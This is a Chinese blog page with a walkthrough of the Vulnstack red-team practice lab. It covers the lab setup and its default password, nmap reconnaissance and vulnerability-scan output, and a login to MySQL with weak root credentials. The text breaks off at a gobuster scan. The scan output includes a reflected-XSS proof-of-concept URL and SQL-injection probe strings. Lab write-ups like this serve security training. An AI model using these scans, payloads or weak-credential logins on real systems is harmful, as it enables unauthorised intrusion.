<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="https://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-6fbfdb3e812309fb.js" defer=""></script><script src="/_next/static/Cn2u-1XBPoyjEdHEI3G0H/_buildManifest.js" defer=""></script><script src="/_next/static/Cn2u-1XBPoyjEdHEI3G0H/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"Vulnstack红队评估实战靶场(一)","contentHtml":"\u003ch1\u003eATT\u0026#x26;CK红队评估实战靶场(一)\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"http://vulnstack.qiyuanxuetang.net/vuln/detail/2/\"\u003ehttp://vulnstack.qiyuanxuetang.net/vuln/detail/2/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image.png\" alt=\"拓扑\"\u003e\u003c/p\u003e\n\u003ch2\u003e靶场搭建\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e靶机通用密码：\u003ccode\u003ehongrisec@2019\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eip\u003c/code\u003e网络设置\u003c/p\u003e\n\u003cp\u003e创建一个仅主机的虚拟网卡，网段是\u003ccode\u003e192.168.52.0\u003c/code\u003e ，\u003ccode\u003enat\u003c/code\u003e网卡随意\u003ccode\u003eip\u003c/code\u003e，用来模拟\u003ccode\u003eweb\u003c/code\u003e服务器外网，我这里是\u003ccode\u003e192.168.75.0\u003c/code\u003e网段\u003c/p\u003e\n\u003cp\u003e内网主机\u003ccode\u003ewindows 2003\u003c/code\u003e以及\u003ccode\u003ewindows 2008\u003c/code\u003e使用仅主机的虚拟网卡\u003c/p\u003e\n\u003cp\u003e边缘主机\u003ccode\u003ewindows 7\u003c/code\u003e使用仅主机的虚拟网卡以及\u003ccode\u003enat\u003c/code\u003e网卡\u003c/p\u003e\n\u003cp\u003e渗透主机\u003ccode\u003ekali\u003c/code\u003e也使用\u003ccode\u003enat\u003c/code\u003e网卡（\u003ccode\u003e192.168.75.151\u003c/code\u003e）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e测试网络\u003c/p\u003e\n\u003cp\u003e边缘主机可以\u003ccode\u003eping\u003c/code\u003e通外网以及域成员，其他两个域成员不能通外网\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e在边缘主机\u003ccode\u003ewin7\u003c/code\u003e 的\u003ccode\u003ec\u003c/code\u003e盘打开\u003ccode\u003ephpstudy\u003c/code\u003e ，然后将服务启动（假如\u003ccode\u003ephpmystudy\u003c/code\u003e打开报错，就把虚拟机兼容性改为\u003ccode\u003e17.x\u003c/code\u003e）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e靶场环境搭建完成，开始渗透\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003e主机发现端口扫描\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e使用\u003ccode\u003enmap\u003c/code\u003e扫描网段类存活主机\u003c/p\u003e\n\u003cp\u003e因为靶机是我最后添加的，所以靶机IP是\u003ccode\u003e186\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e                    \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-12 22:26 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.1\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00019\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:C0:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.2\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00016\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:FB:CA:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.186\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00024\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e55\u003c/span\u003e:CF:\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.254\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00024\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:E8:BD:\u003cspan class=\"hljs-title function_ invoke__\"\u003eA6\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.151\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描主机开放端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sT -min-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.186\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-12 22:26 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.186\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00061\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65532\u003c/span\u003e filtered tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (no-response)\nPORT     STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   open  http\n\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e/tcp  open  msrpc\n\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e/tcp open  mysql\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e55\u003c/span\u003e:CF:\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描主机服务版本以及系统版本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sV -sT -O -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.186\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-12 22:27 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.186\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00042\u003c/span\u003es latency).\n\nPORT     STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   open  http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e ((Win32) OpenSSL/\u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003ej PHP/\u003cspan class=\"hljs-number\"\u003e5.4\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e)\n\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e/tcp  open  msrpc   Microsoft Windows RPC\n\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e/tcp open  mysql   \u003cspan class=\"hljs-title function_ invoke__\"\u003eMySQL\u003c/span\u003e (unauthorized)\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e55\u003c/span\u003e:CF:\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e (VMware)\nWarning: OSScan results may be unreliable because we could not find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e open \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nAggressive OS guesses: Microsoft Windows Phone \u003cspan class=\"hljs-number\"\u003e7.5\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e8.0\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003e%), Microsoft Windows Embedded Standard \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003e%), Microsoft Windows \u003cspan class=\"hljs-number\"\u003e8.1\u003c/span\u003e \u003cspan class=\"hljs-title function_ invoke__\"\u003eR1\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e94\u003c/span\u003e%), Microsoft Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e Beta \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e92\u003c/span\u003e%), Microsoft Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e R2 \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e Windows \u003cspan class=\"hljs-number\"\u003e8.1\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e92\u003c/span\u003e%), Microsoft Windows \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e Professional \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e Windows \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e92\u003c/span\u003e%), Microsoft Windows Vista SP0 \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e SP1, Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e SP1, \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e Windows \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e92\u003c/span\u003e%), Microsoft Windows Vista SP2, Windows \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e SP1, \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e92\u003c/span\u003e%), Microsoft Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e R2 \u003cspan class=\"hljs-title function_ invoke__\"\u003eSP1\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e90\u003c/span\u003e%), Microsoft Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e \u003cspan class=\"hljs-title function_ invoke__\"\u003eSP1\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e89\u003c/span\u003e%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-title function_ invoke__\"\u003ehost\u003c/span\u003e (test conditions non-ideal).\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:window\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -script=vuln -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.186\u003c/span\u003e                                                                                                                                                               \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e CST                                                                                                                                                \nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.186\u003c/span\u003e                                                                                                                                                                               \nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00066\u003c/span\u003es latency).                                                                                                                                                                                    \n                                                                                                                                                                                                                  \nPORT     STATE SERVICE                                                                                                                                                                                            \n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http                                                                                                                                                                                               \n|_http-dombased-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any DOM based XSS.                                                                                                                                                             \n| http-sql-injection:                                                                                                                                                                                             \n|   Possible sqli for queries:                                                                                                                                                                                    \n|     http://192.168.75.186:80/l.php?act=phpinfo%27%20OR%20sqlspider                                                                                                                                              \n|     http://192.168.75.186:80/l.php?act=Function%27%20OR%20sqlspider                                                                                                                                             \n|     http://192.168.75.186:80/l.php?act=phpinfo%27%20OR%20sqlspider                                                                                                                                              \n|     http://192.168.75.186:80/l.php?act=Function%27%20OR%20sqlspider                                                                                                                                             \n|     http://192.168.75.186:80/l.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000%27%20OR%20sqlspider                                                                                                                 \n|     http://192.168.75.186:80/l.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42%27%20OR%20sqlspider                                                                                                                 \n|     http://192.168.75.186:80/l.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42%27%20OR%20sqlspider                                                                                                                 \n|   Possible sqli for forms:                                                                                                                                                                                      \n|     Form at path: /, form'\u003c/span\u003es action: /l.php\u003cspan class=\"hljs-comment\"\u003e#bottom. Fields that might be vulnerable:                                                                                                                             \u003c/span\u003e\n|       host                                                                                                                                                                                                      \n|       port                                                                                                                                                                                                      \n|       login                                                                                                                                                                                                     \n|       funName                                                                                                                                                                                                   \n|     Form at path: /l.php, form\u003cspan class=\"hljs-string\"\u003e's action: /l.php#bottom. Fields that might be vulnerable:                                                                                                                        \n|       host                                                                                                                                                                                                      \n|       port                                                                                                                                                                                                      \n|       login                                                                                                                                                                                                     \n|_      funName                                                                                                                                                                                                   \n| http-slowloris-check:                                                                                                                                                                                                   \n|_http-trace: TRACE is enabled                                     \n|_http-stored-xss: Couldn'\u003c/span\u003et find \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e stored XSS vulnerabilities.                                         \n| http-phpself-xss:                                 \n|   VULNERABLE:                                     \n|   Unsafe use of $_SERVER[\u003cspan class=\"hljs-string\"\u003e\"PHP_SELF\"\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e PHP files                                                      \n|     State: VULNERABLE (Exploitable)               \n|       PHP files are \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e handling safely the variable $_SERVER[\u003cspan class=\"hljs-string\"\u003e\"PHP_SELF\"\u003c/span\u003e] causing Reflected Cross Site Scripting vulnerabilities.\n|                                                   \n|     Extra information:                            \n|                                                   \n|   Vulnerable files \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e proof of concept:         \n|     http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.186\u003c/span\u003e/l.php/%\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e%\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/%3E%3Cscript%3Ealert(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)%3C/script%3E                            \n|   Spidering limited to: maxdepth=\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e; maxpagecount=\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e; withinhost=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.186\u003c/span\u003e                         \n|     References:                \n|   Spidering limited to: maxdepth=\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e; maxpagecount=\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e; withinhost=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.186\u003c/span\u003e                         \n|     References:                                   \n|       https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)                                       \n|_      http://php.net/manual/en/reserved.variables.server.php                                           \n| http-enum:                                        \n|   /phpinfo.php: Possible information file         \n|   /phpmyadmin/: phpMyAdmin                        \n|   /phpMyAdmin/: phpMyAdmin                        \n|_  /PHPMyAdmin/: phpMyAdmin                        \n\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  msrpc                                \n\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  mysql                                \nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0C:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e55\u003c/span\u003e:CF:\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扫描发现\u003ccode\u003e135\u003c/code\u003e端口，因为也是\u003ccode\u003ewindow\u003c/code\u003e主机，所以可能有用\u003c/p\u003e\n\u003cp\u003e不过还是从\u003ccode\u003eweb\u003c/code\u003e渗透开始，发现可能是\u003ccode\u003esql\u003c/code\u003e注入的地方，也发现了\u003ccode\u003ephpmyadmin\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eweb渗透\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e访问主页\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e发现是\u003ccode\u003ephpStudy探针\u003c/code\u003e 能暴露出很多东西\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e主机版本 \u003ccode\u003eWindows 7 Business Edition Service Pack 1\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e服务版本 \u003ccode\u003eApache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e网站的绝对路径 \u003ccode\u003eC:/phpStudy/WWW\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ePHP\u003c/code\u003e 已经安装的模块\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e拉取到最下面有个\u003ccode\u003eMySQL数据库连接检测\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们尝试弱口令账户密码都使用\u003ccode\u003eroot\u003c/code\u003e ，测试链接成功….\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e不管怎么说，我们先对网站进行目录扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan 